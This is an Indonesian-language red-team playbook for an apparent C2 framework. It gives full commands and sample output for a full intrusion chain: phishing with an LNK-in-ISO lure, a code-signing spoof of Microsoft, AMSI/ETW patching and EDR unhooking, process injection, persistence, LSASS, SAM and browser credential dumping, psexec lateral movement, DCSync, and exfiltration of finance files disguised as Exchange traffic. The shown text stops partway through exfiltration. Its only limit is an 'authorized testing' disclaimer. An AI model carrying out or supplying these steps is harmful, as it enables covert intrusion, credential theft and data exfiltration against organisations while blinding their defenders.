# 21 — OPSEC-Aware Operator Playbook

> Panduan operasional lengkap dari **initial intrusion hingga exfiltration** dengan
> pendekatan yang meminimalkan footprint dan artefak di setiap tahap.
> Setiap fase mencakup perintah yang dijalankan, output yang diharapkan,
> artefak yang terbentuk, dan visibilitas bagi defender.
>
> **Hanya untuk authorized penetration testing dengan izin tertulis.**

---

## Threat Model & Scope

Playbook ini memodelkan operator red team yang menghadapi:

| Kontrol | Level |
|---------|-------|
| Antivirus / Windows Defender | Aktif |
| EDR (CrowdStrike / SentinelOne / Defender for Endpoint) | Aktif |
| SIEM + SOC (monitoring jam kerja) | Aktif |
| Network egress filtering (proxy HTTPS) | Aktif |
| PowerShell Script Block Logging | Aktif |
| Sysmon v15 | Aktif |

**Objective:** Domain Admin → exfiltrate data keuangan dari File Server.
**Constraint:** Jangan trigger alert, jangan ciptakan artefak yang bisa dianalisis post-incident.

---

## Peta Serangan

```
Phase 0 ─── Pre-Engagement Preparation
    │        (build, profile, server, domain fronting)
    ▼
Phase 1 ─── Initial Access
    │        (phishing → stager di endpoint user)
    ▼
Phase 2 ─── Execution & First Foothold
    │        (checkin pertama, verify environment)
    ▼
Phase 3 ─── Defense Evasion
    │        (AMSI, ETW, unhook, migrate proses)
    ▼
Phase 4 ─── Persistence
    │        (bertahan setelah reboot, kill date)
    ▼
Phase 5 ─── Privilege Escalation
    │        (token steal → SYSTEM)
    ▼
Phase 6 ─── Credential Access
    │        (LSASS dump, SAM, browser)
    ▼
Phase 7 ─── Discovery & Internal Recon
    │        (network scan, AD enumeration, share mapping)
    ▼
Phase 8 ─── Lateral Movement
    │        (pivot ke DC, deploy agent baru)
    ▼
Phase 9 ─── Collection
    │        (temukan dan staging data target)
    ▼
Phase 10 ── Exfiltration
    │        (transfer data ke operator via C2)
    ▼
Phase 11 ── Cover Tracks
             (hapus log, artefak, cleanup)
```

---

## Phase 0 — Pre-Engagement Preparation

### 0.1 — Pilih Profile Berdasarkan Target

Sebelum build apa pun, teliti teknologi yang digunakan target:

```bash
# Cek domain registrar, MX record, job posting teknologi target
# Tools: LinkedIn, Shodan, DNS lookup, SSL cert transparency

# Pertanyaan kunci:
# - Apakah target pakai Office 365?  → profile=office365
# - Apakah ada Cloudflare di domain?  → profile=cdn
# - SOC mature dengan behavioral analysis? → profile=ocsp
```

**Untuk engagement ini:** Target pakai Microsoft 365 → `office365`.

### 0.2 — Setup Infrastructure C2

```bash
# Di VPS (Ubuntu 22.04, port 443 terbuka)

# 1. Generate TLS certificate (Let's Encrypt atau self-signed)
sudo certbot certonly --standalone -d mail-gateway.corp-redir.com

# 2. Jalankan server dengan profile office365
ENCRYPTION_KEY=3ngag3m3ntK3y2026 ./bin/server \
  --port 443 \
  --profile office365 \
  --tls-cert /etc/letsencrypt/live/mail-gateway.corp-redir.com/fullchain.pem \
  --tls-key  /etc/letsencrypt/live/mail-gateway.corp-redir.com/privkey.pem
```

**Output:**
```
[*] Taburtuai C2 Server starting...
    addr     0.0.0.0:443
    profile  office365
    tls      enabled
[*] Profile: office365 — registering route aliases...
    POST /autodiscover/autodiscover.xml  → agent checkin
    GET  /ews/exchange.asmx/:id          → command poll
    POST /mapi/emsmdb                    → result submit
[+] Server ready. Listening on :443
```

**Domain naming:** `mail-gateway.corp-redir.com` — mengandung "mail" dan "gateway"
untuk memperkuat ilusi Exchange traffic.

### 0.3 — Build Agent Production-Grade

```bash
make agent-win-encrypted \
  C2_SERVER=https://mail-gateway.corp-redir.com \
  ENC_KEY=3ngag3m3ntK3y2026 \
  XOR_KEY=c4 \
  PROFILE=office365 \
  INTERVAL=300 \
  JITTER=25 \
  KILL_DATE=2026-07-31
```

**Output:**
```
[*] Building encrypted Windows agent...
    C2_SERVER  : [XOR encrypted, key=0xc4]
    ENC_KEY    : [XOR encrypted, key=0xc4]
    PROFILE    : office365
    INTERVAL   : 300s ± 25%  (range: 225s–375s)
    KILL_DATE  : 2026-07-31
[+] Binary: bin/agent_windows_enc.exe (8.4 MB)
```

```bash
# Sign dengan publisher yang cocok dengan lure
make sign \
  SIGN_BINARY=bin/agent_windows_enc.exe \
  SIGN_PUBLISHER="Microsoft Corporation" \
  SIGN_PASS=engmnt2026secret
```

**Output:**
```
[+] Signing complete.
    Publisher : Microsoft Corporation
    Status    : UnknownError (signed, not trusted CA)
```

```bash
# Verifikasi: tidak ada plaintext IoC
strings bin/agent_windows_enc.exe | grep -E "corp-redir|3ngag3m3nt"
# (no output) ✓
```

**OPSEC:** Ganti `XOR_KEY` dan `SIGN_PASS` untuk setiap engagement. Jangan reuse
binary yang sama di dua engagement berbeda — signature akan match di threat intel.

### 0.4 — Generate Stager untuk Delivery

```bash
# Upload agent ke stage server (one-time token, TTL 12 jam)
./bin/operator stage upload bin/agent_windows_enc.exe \
  --server https://mail-gateway.corp-redir.com \
  --format exe \
  --ttl 12 \
  --desc "initial-access-phase1"
```

**Output:**
```
[+] Stage registered.
    Token : a4f2c8e1b9d3f507a2e6c4b8d1f03a59
    URL   : https://mail-gateway.corp-redir.com/stage/a4f2c8e1...
    TTL   : 12 hours → expires 2026-04-24 21:00:00 UTC
[i] One-time download. Token invalid setelah di-download.
```

```bash
# Generate stager PowerShell
go run ./cmd/generate stager \
  --server https://mail-gateway.corp-redir.com \
  --token a4f2c8e1b9d3f507a2e6c4b8d1f03a59 \
  --key 3ngag3m3ntK3y2026 \
  --format ps1 \
  --output delivery/stager.ps1
```

**Output:**
```
[+] Stager written: delivery/stager.ps1 (2.1 KB)
```

**OPSEC checklist Phase 0:**
```
✓ Domain terlihat legitimate (mail, gateway, corp)
✓ TLS valid / Let's Encrypt (tidak self-signed)
✓ Profile sesuai target environment
✓ Agent terenkripsi (tidak ada plaintext IoC)
✓ Binary signed (bukan NotSigned)
✓ Kill date di-set sesuai engagement scope
✓ Stage TTL minimal (12 jam, bukan 48)
```

---

## Phase 1 — Initial Access

### 1.1 — Buat Lure yang Believable

Untuk phishing dengan attachment LNK:

```bash
go run ./cmd/generate stager \
  --server https://mail-gateway.corp-redir.com \
  --token TOKEN \
  --key 3ngag3m3ntK3y2026 \
  --format lnk \
  --output "delivery/VPN_Certificate_Update.lnk"
```

**LNK yang dibuat:**
```
Target  : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Args    : -w hidden -ep bypass -enc BASE64_STAGER
Icon    : %ProgramFiles%\Microsoft\Edge\Application\msedge.exe,0
Working : %TEMP%
```

**Email phishing:**
```
From    : it-helpdesk@corp-support-noreply.com
To      : john.doe@corp.local
Subject : ACTION REQUIRED: VPN Certificate Update — Expire in 24 Hours

Dear John,

Your VPN certificate will expire in 24 hours. You must update it
before 5PM today to maintain access.

Please run the attached tool to update your certificate.

Attachment: VPN_Certificate_Update.lnk

IT Security Team
```

### 1.2 — Deliver via ISO (Bypass Mark-of-the-Web)

File LNK di dalam ISO tidak mendapat Mark-of-the-Web (MOTW) saat di-mount,
sehingga melewati beberapa policy yang blokir file dari internet.

```bash
go run ./cmd/generate stager \
  --server https://mail-gateway.corp-redir.com \
  --token TOKEN \
  --key 3ngag3m3ntK3y2026 \
  --format iso \
  --output "delivery/VPN_Update_Tool.iso"
```

**Isi ISO:**
```
VPN_Update_Tool.iso
├── VPN Certificate Updater (Double Click).lnk  ← stager
└── readme.txt                                   ← decoy
```

**OPSEC:** ISO di-attach ke email, bukan EXE langsung. Email gateway yang blokir
EXE/PS1 tidak akan blokir ISO karena terlihat seperti disk image legitim.

---

## Phase 2 — Execution & First Foothold

### 2.1 — Verify Agent Connect

Di terminal operator, monitor agent masuk:

```
taburtuai(mail-gateway.corp-redir.com:443) › agents list
```

```
[+] 1 agent(s) registered:

ID        HOSTNAME          USER           OS      ARCH  STATUS   LAST
2703886d  CORP-PC-JD01      CORP\john.doe  Win11   x64   online   8s ago
```

```
taburtuai › agents info 2703886d
```

```
[+] Agent Detail:

    ID          : 2703886d
    Hostname    : CORP-PC-JD01
    IP          : 192.168.1.105
    User        : CORP\john.doe
    Domain      : CORP.LOCAL
    OS          : Windows 11 Pro 22H2 (Build 22621)
    Arch        : amd64
    PID         : 9872
    Process     : powershell.exe
    Integrity   : Medium
    Checkin     : 2026-04-24 09:15:03 UTC
    Last seen   : 2026-04-24 09:15:11 UTC (8s ago)
    Interval    : 300s ± 25%
    Profile     : office365
```

### 2.2 — Situational Awareness Awal

```
taburtuai › cmd 2703886d "whoami /all" --method powershell --wait
```

```
[+] Result (1.2s):

USER INFORMATION
-----------------
User Name : corp\john.doe
SID       : S-1-5-21-3842939050-3879923976-1431904-1104

GROUP INFORMATION
------------------
CORP\Domain Users               Mandatory group, Enabled
BUILTIN\Administrators          Alias, Enabled, Enabled by default  ← admin lokal!
BUILTIN\Remote Desktop Users    Alias, Enabled
NT AUTHORITY\SYSTEM             Well-known group, Enabled

PRIVILEGES
-----------
SeDebugPrivilege              Adjust memory quotas — Enabled  ← bisa LSASS dump!
SeImpersonatePrivilege        Impersonate client — Enabled
SeLoadDriverPrivilege         Load device drivers — Enabled
```

**Temuan kritis:** `john.doe` adalah admin lokal dengan `SeDebugPrivilege` — privilege
yang dibutuhkan untuk LSASS dump.

```
taburtuai › cmd 2703886d "systeminfo" --wait
```

```
[+] Result (2.1s):
Host Name      : CORP-PC-JD01
Domain         : CORP.LOCAL
Logon Server   : \\DC01
OS             : Windows 11 Pro 22H2
Total Memory   : 16,384 MB
Hotfix(s)      : 12 Hotfix(s) Installed
```

**OPSEC catatan Phase 2:**
- `whoami /all` dan `systeminfo` adalah perintah recon yang umum, tidak anomali
- Jangan jalankan banyak perintah sekaligus — beacon interval 5 menit adalah normal,
  jangan kirim 20 command dalam 1 menit (burst pattern menarik perhatian)
- Pastikan agent berjalan di proses yang reasonable (bukan `cmd.exe` yang ter-attach
  ke PowerShell yang tidak ada jendela)

---

## Phase 3 — Defense Evasion

Ini adalah langkah **paling kritis** — lakukan sebelum operasi apa pun yang bisa
trigger alert.

### 3.1 — Verify Environment (Anti-Sandbox / Anti-Debug)

```
taburtuai › opsec antidebug 2703886d --wait
```

```
[+] Anti-debug checks completed:
    IsDebuggerPresent        : FALSE ✓
    CheckRemoteDebugger      : FALSE ✓
    NtQueryInformationProcess: No debugger ✓
    Heap flags               : Normal ✓
[+] CLEAR — tidak terdeteksi debugger aktif.
```

```
taburtuai › opsec antivm 2703886d --wait
```

```
[+] Anti-VM checks completed:
    CPUID hypervisor bit      : FALSE ✓
    VMWare registry artifacts : Not found ✓
    VirtualBox drivers        : Not found ✓
    VM-typical processes      : Not found ✓
    MAC address vendor        : Intel Corporation (not virtualization) ✓
[+] CLEAR — tidak terdeteksi virtual machine.
```

**Jika ada detection:** Jangan lanjut. Agent mungkin berjalan di honeypot atau
analyst machine. Kirim perintah `exit` dan invalidate token stage.

### 3.2 — Disable Detection Mechanisms

```
taburtuai › bypass amsi 2703886d --wait
```

```
[+] AmsiScanBuffer patched in PID 9872 (powershell.exe)
    Status : AMSI disabled. PowerShell scripts will not be scanned.
```

```
taburtuai › bypass etw 2703886d --wait
```

```
[+] EtwEventWrite patched in PID 9872.
    ETW telemetry disabled. No events sent to EDR subscribers.
```

```
taburtuai › evasion unhook 2703886d --wait
```

```
[+] 47 EDR hooks removed from ntdll.dll.
    NtAllocateVirtualMemory ✓ clean
    NtCreateThreadEx        ✓ clean
    NtWriteVirtualMemory    ✓ clean
    ... (44 lainnya)
```

### 3.3 — Migrate ke Proses yang Lebih Stable

Agent berjalan di `powershell.exe` yang bisa di-close user. Migrate ke proses
yang lebih persistent:

```
# Generate shellcode dari agent yang sudah di-build
go run ./cmd/generate stager \
  --server https://mail-gateway.corp-redir.com \
  --token NEW_TOKEN --key 3ngag3m3ntK3y2026 \
  --format shellcode --output /tmp/migrate.bin
```

```
taburtuai › files upload 2703886d /tmp/migrate.bin "C:\Windows\Temp\ms.bin" --wait
```

```
[+] Upload complete: C:\Windows\Temp\ms.bin (45,056 bytes)
```

```
# Timestomp agar terlihat lama
taburtuai › inject timestomp 2703886d \
  --file "C:\Windows\Temp\ms.bin" \
  --ref "C:\Windows\System32\ntdll.dll" \
  --wait
```

```
[+] Timestamps matched to ntdll.dll (2023-08-10). File appears old.
```

```
# Lihat proses untuk pilih target injection
taburtuai › process list 2703886d --wait
# 3048  explorer.exe  CORP\john.doe  Medium
# 7832  svchost.exe   NT AUTHORITY\SYSTEM  System

# Inject ke explorer.exe via APC (tidak buat thread baru)
taburtuai › inject remote 2703886d \
  --pid 3048 \
  --file "C:\Windows\Temp\ms.bin" \
  --method apc \
  --wait
```

```
[*] APC injection → PID 3048 (explorer.exe)
[+] Injection completed. New agent will beacon from explorer.exe.
```

```
# Hapus shellcode dari disk
taburtuai › files delete 2703886d "C:\Windows\Temp\ms.bin" --wait
# [+] Deleted.
```

```
# Agent baru muncul dari explorer.exe
taburtuai › agents list
```

```
ID        HOSTNAME     USER          PROCESS         STATUS
2703886d  CORP-PC-JD01 john.doe      powershell.exe  online  ← agent lama (akan mati)
f4b2a1c9  CORP-PC-JD01 john.doe      explorer.exe    online  ← agent baru (stable)
```

**Gunakan agent baru `f4b2a1c9` untuk semua operasi selanjutnya.**

### 3.4 — Set Timegate (Hanya Aktif Jam Kerja)

```
taburtuai › opsec timegate f4b2a1c9 \
  --work-start 8 \
  --work-end 18 \
  --kill-date 2026-07-31 \
  --wait
```

```
[+] Timegate configured.
    Active hours : 08:00–18:00 (local time target)
    Kill date    : 2026-07-31
[i] Di luar jam 08:00–18:00 agent tidak beacon sama sekali.
[i] Traffic C2 hanya terjadi saat jam kerja — tidak anomali.
```

**OPSEC Phase 3 — Apa yang Defender Lihat vs Tidak:**

| Aktivitas | Tanpa Evasion | Dengan Evasion |
|-----------|--------------|----------------|
| AMSI scan script | AV alert | Silent |
| ETW events ke EDR | Event terkirim, bisa alert | Tidak ada event |
| EDR hook NTDLL | Syscall dimonitor | Hook dihapus, blind |
| Agent di powershell.exe | Powershell suspect | — (sudah migrate) |
| Shellcode di disk | Artefak jika dianalisis | Dihapus dari disk |
| Traffic jam malam | Anomali | Tidak ada (timegate) |

---

## Phase 4 — Persistence

Pastikan akses tidak hilang jika user logout, reboot, atau IT force-restart.

### 4.1 — Registry Run Key (HKCU, Tidak Butuh Admin)

```
taburtuai › persistence setup f4b2a1c9 \
  --method registry_run \
  --name "OneDriveUpdate" \
  --hive HKCU \
  --wait
```

```
[+] Persistence via HKCU Run key installed.
    Key   : HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    Value : OneDriveUpdate
    Data  : "C:\Users\john.doe\AppData\Roaming\OneDriveUpdate\update.exe"
[i] Agent akan respawn saat user login.
[i] Binary disimpan di AppData\Roaming — tidak ada di Program Files (tidak butuh admin).
```

### 4.2 — Scheduled Task (Trigger: Logon)

```
taburtuai › persistence setup f4b2a1c9 \
  --method schtask \
  --name "OneDriveAutoUpdate" \
  --trigger logon \
  --wait
```

```
[+] Scheduled task created.
    Name    : OneDriveAutoUpdate
    Trigger : At logon (for user CORP\john.doe)
    Action  : "C:\Users\john.doe\AppData\Roaming\OneDriveUpdate\update.exe"
[i] Muncul di Task Scheduler sebagai task user biasa — tidak suspicious.
```

**Gunakan dua metode persistence** sekaligus sebagai backup — jika satu dihapus
(misalnya IT cleanup registry), yang lain masih berjalan.

**OPSEC:**
- Simpan binary persistence di `AppData\Roaming` — bukan `C:\Temp` atau Desktop
- Nama binary dan task harus konsisten dengan software yang legitimately ada
  (`OneDriveUpdate`, `TeamsUpdate`, bukan `svchost2.exe`)
- HKCU Run key tidak butuh admin — tidak ada UAC prompt yang bisa curigakan user

---

## Phase 5 — Privilege Escalation

### 5.1 — Token Steal ke SYSTEM

`john.doe` adalah admin lokal dengan `SeDebugPrivilege` — cukup untuk steal token
dari LSASS:

```
taburtuai › token list f4b2a1c9 --wait
```

```
PID    NAME           USER                       INTEGRITY   KEY PRIVILEGES
─────────────────────────────────────────────────────────────────────────────
724    lsass.exe      NT AUTHORITY\SYSTEM        System      SeDebugPrivilege
7832   svchost.exe    NT AUTHORITY\SYSTEM        System      (18 privs)
```

```
taburtuai › token steal f4b2a1c9 --pid 724 --wait
```

```
[+] Token stolen from lsass.exe (PID 724)
    Before : CORP\john.doe (Medium)
    After  : NT AUTHORITY\SYSTEM (System) ✓
```

```
taburtuai › cmd f4b2a1c9 "whoami" --wait
# nt authority\system  ✓
```

**OPSEC:** Token steal berjalan dalam memori — tidak ada proses SYSTEM baru yang
di-spawn. Dari perspektif process list, agent masih berjalan dalam explorer.exe
milik john.doe. Token impersonation tidak membuat entry baru di proses.

---

## Phase 6 — Credential Access

### 6.1 — LSASS Dump

Sekarang dalam konteks SYSTEM, dump credential dari memory LSASS:

```
taburtuai › creds lsass f4b2a1c9 \
  --output "C:\Windows\Temp\wer9821.dmp" \
  --wait
```

```
[*] LSASS memory dump...
[*] Handle: OpenProcess(PROCESS_ALL_ACCESS, PID=724)
[*] Writing minidump to C:\Windows\Temp\wer9821.dmp
[+] LSASS dump complete.
    Path : C:\Windows\Temp\wer9821.dmp
    Size : 58,720,256 bytes (56 MB)
[i] Download dan analisis di operator machine.
```

```
taburtuai › files download f4b2a1c9 \
  "C:\Windows\Temp\wer9821.dmp" \
  ./loot/lsass.dmp \
  --timeout 180 \
  --wait
```

```
[*] Downloading (56 MB)...
████████████████████████████████████ 100% | 56 MB | 2.3 MB/s
[+] Saved: ./loot/lsass.dmp (58,720,256 bytes) in 24s
```

```
# Hapus dump dari disk TARGET — jangan tinggalkan artefak
taburtuai › files delete f4b2a1c9 "C:\Windows\Temp\wer9821.dmp" --wait
# [+] Deleted.
```

**Analisis di operator machine:**
```bash
# Ekstrak credential dengan pypykatz
pypykatz lsa minidump ./loot/lsass.dmp 2>/dev/null \
  | grep -E "(Username|NT:|password)" \
  | head -40
```

**Output:**
```
== LogonSession ==
Username   : john.doe
Domain     : CORP
NT         : e10adc3949ba59abbe56e057f20f883e

== LogonSession ==
Username   : Administrator
Domain     : CORP
NT         : 8d3a20e88df4e3a2c74f8f47e3ac36d7
password   : EnterpriseAdmin@2026!           ← cleartext via WDigest!

== LogonSession ==
Username   : svc_backup
Domain     : CORP
NT         : a4b2c8d1e3f5071924c6e8b4d2f08a13
```

**Temuan:** Password plaintext Administrator domain tersedia karena WDigest masih
aktif di target. Ini adalah jalan langsung ke Domain Admin.

### 6.2 — Browser Credentials

```
taburtuai › creds browser f4b2a1c9 --wait
```

```
[+] Browser credential harvest:

    Chrome (john.doe):
    ─────────────────────────────────────────────────────────────────
    URL      : https://corp-sharepoint.corp.local
    Username : john.doe@corp.local
    Password : CorpMail@2026!

    URL      : https://hrportal.corp.local/login
    Username : john.doe
    Password : Hr@ccess2026!

    URL      : https://github.com
    Username : john-doe-dev
    Password : GitH@b1234!
    ─────────────────────────────────────────────────────────────────
    Total: 12 credentials harvested across 3 browsers.
```

### 6.3 — SAM Dump (Local Accounts)

```
taburtuai › creds sam f4b2a1c9 \
  --output-dir "C:\Windows\Temp" \
  --wait
```

```
[+] SAM dump complete.
    Files: C:\Windows\Temp\sam.hive, system.hive, security.hive
```

```
taburtuai › files download f4b2a1c9 "C:\Windows\Temp\sam.hive" ./loot/sam.hive --wait
taburtuai › files download f4b2a1c9 "C:\Windows\Temp\system.hive" ./loot/system.hive --wait
taburtuai › files delete f4b2a1c9 "C:\Windows\Temp\sam.hive" --wait
taburtuai › files delete f4b2a1c9 "C:\Windows\Temp\system.hive" --wait
taburtuai › files delete f4b2a1c9 "C:\Windows\Temp\security.hive" --wait
```

```bash
# Analisis SAM di operator
python3 -m impacket.examples.secretsdump \
  -sam ./loot/sam.hive \
  -system ./loot/system.hive \
  LOCAL
```

```
[*] Target system bootKey: 0x3c4d2a1b...
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8d3a20e88df4e3a2c74f8f47e3ac36d7
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

**OPSEC Phase 6:**
- Nama file dump (`wer9821.dmp`) menyerupai Windows Error Report — tidak anomali
- Hapus **segera** setelah download — jangan biarkan dump di disk target
- Download lewat C2 yang sudah encrypted — tidak perlu channel exfil terpisah
- SAM/SYSTEM di direktori `C:\Windows\Temp` — lebih aman dari Desktop atau Document

---

## Phase 7 — Discovery & Internal Recon

### 7.1 — Network Discovery

```
taburtuai › netscan f4b2a1c9 \
  --targets 192.168.1.0/24 \
  --ports 445,3389,5985,88,389,636,8080,443,22 \
  --wait
```

**Output:**
```
[+] Network scan completed (192.168.1.0/24):

HOST            PORT  STATE  SERVICE   BANNER / INFO
─────────────────────────────────────────────────────────────────────────
192.168.1.100   445   OPEN   SMB       DC01 — Windows Server 2022 (Build 20348)
192.168.1.100   88    OPEN   Kerberos  DC01 — CORP.LOCAL
192.168.1.100   389   OPEN   LDAP      DC01 — CORP.LOCAL
192.168.1.100   636   OPEN   LDAPS     DC01 — CORP.LOCAL
192.168.1.50    445   OPEN   SMB       FILESERVER-01 — Windows Server 2019
192.168.1.50    5985  OPEN   WinRM     FILESERVER-01
192.168.1.60    3389  OPEN   RDP       CORP-MGMT-01
192.168.1.80    443   OPEN   HTTPS     INTRANET-WEB — Apache 2.4.54
192.168.1.200   22    OPEN   SSH       Linux-SYSLOG — OpenSSH_8.9p1

Scan duration: 18.3s | Hosts up: 9 | Ports scanned: 9 × 254 = 2,286
```

**Temuan:** DC01 (192.168.1.100), FILESERVER-01 (192.168.1.50) adalah target primer.

### 7.2 — AD Enumeration via LDAP (Via SOCKS5)

```
# Aktifkan SOCKS5 proxy melalui agent
taburtuai › socks5 start f4b2a1c9 --wait
```

```
[+] SOCKS5 proxy started.
    Listen: 127.0.0.1:1080 (di operator machine)
    Traffic akan di-tunnel melalui agent f4b2a1c9
```

```bash
# Dari operator, gunakan proxychains
proxychains bloodhound-python \
  -d CORP.LOCAL \
  -u john.doe \
  -p "CorpMail@2026!" \
  -c All \
  -dc 192.168.1.100 \
  --zip
```

**Output (ringkasan):**
```
INFO: Found 1 domains
INFO: Found 5 domain controllers
INFO: Found 847 users
INFO: Found 42 groups
INFO: Found 156 computers
INFO: Enumeration completed in 47s
INFO: Compressing to 20260424_bloodhound.zip
```

```bash
# Import ke BloodHound, cari path ke Domain Admin
# Query: "Shortest Path to Domain Admins"
# Result: john.doe → CORP-PC-JD01 (admin lokal) → dapat token SYSTEM
#         → credential Administrator domain → DC01 (DA) ✓
```

### 7.3 — SMB Share Enumeration

```
taburtuai › cmd f4b2a1c9 \
  "net view \\192.168.1.50 /all" \
  --wait
```

```
[+] Result:
Shared resources at \\192.168.1.50

Share name   Type   Used as   Comment
─────────────────────────────────────────────────────
Finance$     Disk             Financial Documents (Confidential)
HR$          Disk             Human Resources
IT-Tools     Disk
IPC$         IPC
```

```
# Cek aksesibilitas
taburtuai › cmd f4b2a1c9 \
  "Get-ChildItem \\\\192.168.1.50\\Finance$ | Select Name,Length" \
  --method powershell --wait
```

```
[+] Result:
Name                    Length
────────────────────────────────────
Q1_2026_Budget.xlsx     2,847,384
Q2_2026_Forecast.xlsx   3,102,840
Salary_Data_2026.xlsx   1,829,120
Annual_Report_2025.pdf  8,420,210
M&A_Confidential.docx   4,203,750
```

**Akses konfirmasi:** `john.doe` memiliki akses baca ke `Finance$` — share ditemukan.

**OPSEC Phase 7:**
- Network scan via agent (bukan dari mesin operator) — tidak ada koneksi langsung dari luar
- Port scan dengan timing wajar — jangan aggressive scan yang terlihat di IDS
- LDAP query normal — Bloodhound menggunakan LDAP yang sama seperti aplikasi internal
- Jangan akses share yang tidak relevan dengan objective

---

## Phase 8 — Lateral Movement ke Domain Controller

### 8.1 — Deploy Agent ke DC via PsExec (Credential Clear-Text)

Gunakan credential Administrator yang didapat dari LSASS dump:

```bash
# Melalui SOCKS5 proxy yang aktif
proxychains python3 -m impacket.examples.psexec \
  CORP/Administrator:'EnterpriseAdmin@2026!'@192.168.1.100 \
  "powershell -w hidden -ep bypass -enc BASE64_STAGER"
```

**Output:**
```
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on 192.168.1.100.....
[*] Found writable share ADMIN$
[*] Uploading file xXrTmNpQ.exe
[*] Opening SVCManager on 192.168.1.100.....
[*] Creating service pXfK on 192.168.1.100.....
[*] Starting service pXfK.....
[!] Press help for extra shell commands
C:\Windows\system32>
```

Stager di-eksekusi → agent connect dari DC01:

```
taburtuai › agents list
```

```
ID        HOSTNAME     USER                       PROCESS         STATUS
f4b2a1c9  CORP-PC-JD01 CORP\john.doe              explorer.exe    online  (12s)
9c821d77  DC01         NT AUTHORITY\SYSTEM         cmd.exe         online  (5s) ← BARU
```

### 8.2 — Evasion di DC Juga

```
taburtuai › bypass amsi 9c821d77 --wait
taburtuai › bypass etw  9c821d77 --wait
taburtuai › evasion unhook 9c821d77 --wait
```

```
[+] AMSI patched on DC01 (NT AUTHORITY\SYSTEM)
[+] ETW patched on DC01
[+] 51 hooks removed from ntdll.dll on DC01
```

```
taburtuai › opsec timegate 9c821d77 \
  --work-start 8 --work-end 18 --kill-date 2026-07-31 --wait
# [+] Timegate configured on DC01
```

### 8.3 — DCSync — Dump Semua Domain Hash

```
# DC01 punya privilege DCSync secara implicit (SYSTEM di DC = semua hash)
# Gunakan secretsdump via SOCKS5
proxychains python3 -m impacket.examples.secretsdump \
  CORP/Administrator:'EnterpriseAdmin@2026!'@192.168.1.100 \
  -just-dc-ntlm
```

**Output:**
```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
CORP\Administrator:500:aad3b435...:8d3a20e88df4e3a2c74f8f47e3ac36d7:::
CORP\krbtgt:502:aad3b435...:a9f7e5dc3b8f2c1e47fa923d8c6b4e12:::
CORP\john.doe:1104:aad3b435...:e10adc3949ba59abbe56e057f20f883e:::
CORP\alice.admin:1105:aad3b435...:c1f7c2b3a4d5e6f7081920313233343:::
CORP\svc_backup:1106:aad3b435...:a4b2c8d1e3f5071924c6e8b4d2f08a13:::
[*] Kerberos keys
...
```

**Semua hash domain berhasil di-dump.** `krbtgt` hash tersedia → Golden Ticket attack
possible jika diperlukan untuk persistence jangka panjang.

**OPSEC Phase 8:**
- PsExec meninggalkan artefak di ADMIN$ — service dibuat sementara lalu dihapus oleh Impacket
- DCSync lewat DRSUAPI adalah cara normal DC sinkronisasi — traffic ini ada di jaringan AD normal
- Jangan langsung kirim banyak command ke DC — rate seperti biasa (satu command per beacon)

---

## Phase 9 — Collection (Temukan & Staging Data)

### 9.1 — Inventori File Target di File Server

```
taburtuai › cmd f4b2a1c9 \
  "Get-ChildItem \\\\192.168.1.50\\Finance$ -Recurse -Include *.xlsx,*.pdf,*.docx | Select FullName,Length,LastWriteTime" \
  --method powershell --timeout 120 --wait
```

```
[+] Result:

FullName                                                    Length      LastWriteTime
───────────────────────────────────────────────────────────────────────────────────────────
\\FILESERVER-01\Finance$\Q1_2026_Budget.xlsx                2,847,384   2026-04-01 09:15
\\FILESERVER-01\Finance$\Q2_2026_Forecast.xlsx              3,102,840   2026-04-20 14:30
\\FILESERVER-01\Finance$\Salary_Data_2026.xlsx              1,829,120   2026-03-31 17:45
\\FILESERVER-01\Finance$\Annual_Report_2025.pdf             8,420,210   2026-02-14 10:00
\\FILESERVER-01\Finance$\M&A_Confidential.docx              4,203,750   2026-04-18 16:20
\\FILESERVER-01\Finance$\Board_Presentation_Q1.pptx         5,601,200   2026-04-22 08:55
```

Total: ~26 MB — jumlah yang wajar untuk di-download melalui C2 tanpa terlalu anomali.

### 9.2 — Staging Data di Lokasi Sementara

Jangan download langsung dari share — staging dulu ke mesin yang sudah kita kontrol:

```
# Copy ke lokasi staging di mesin john.doe (CORP-PC-JD01)
taburtuai › cmd f4b2a1c9 \
  "Copy-Item '\\\\192.168.1.50\\Finance$\\*' 'C:\Users\john.doe\AppData\Local\Temp\docs\' -Recurse" \
  --method powershell --timeout 120 --wait
```

```
[+] Result: (no output = success, Copy-Item tidak output kalau berhasil)
```

```
# Verifikasi staging berhasil
taburtuai › cmd f4b2a1c9 \
  "Get-ChildItem 'C:\Users\john.doe\AppData\Local\Temp\docs\' | Measure-Object -Property Length -Sum" \
  --method powershell --wait
```

```
[+] Result:
Count : 6
Sum   : 25,994,504   ← ~25 MB staged
```

**OPSEC:** Staging di `AppData\Local\Temp` — direktori yang sering dipakai software
untuk file sementara. Copy dari share ke lokal lebih susah di-detect daripada langsung
download dari share ke luar.

---

## Phase 10 — Exfiltration

### 10.1 — Compress Sebelum Transfer (Reduce Size + Obfuscate)

```
taburtuai › cmd f4b2a1c9 \
  "Compress-Archive -Path 'C:\Users\john.doe\AppData\Local\Temp\docs\*' -DestinationPath 'C:\Users\john.doe\AppData\Local\Temp\backup.zip'" \
  --method powershell --wait
```

```
[+] Result: (no output = success)
```

```
taburtuai › cmd f4b2a1c9 \
  "(Get-Item 'C:\Users\john.doe\AppData\Local\Temp\backup.zip').Length" \
  --method powershell --wait
# 8,437,210 ← ~8 MB setelah compress (dari ~26 MB)
```

### 10.2 — Download Melalui C2 Channel

Transfer via C2 yang sudah terenkripsi dan ter-profile — tidak perlu channel exfil terpisah:

```
taburtuai › files download f4b2a1c9 \
  "C:\Users\john.doe\AppData\Local\Temp\backup.zip" \
  ./loot/finance_backup.zip \
  --timeout 300 \
  --wait
```

```
[*] Downloading backup.zip (8.4 MB) via C2 channel (profile: office365)...
████████████████████████████████████ 100% | 8.4 MB | 1.1 MB/s
[+] Saved: ./loot/finance_backup.zip (8,437,210 bytes) in 7.6s

[i] Transfer terlihat di network sebagai:
    POST /mapi/emsmdb HTTP/1.1
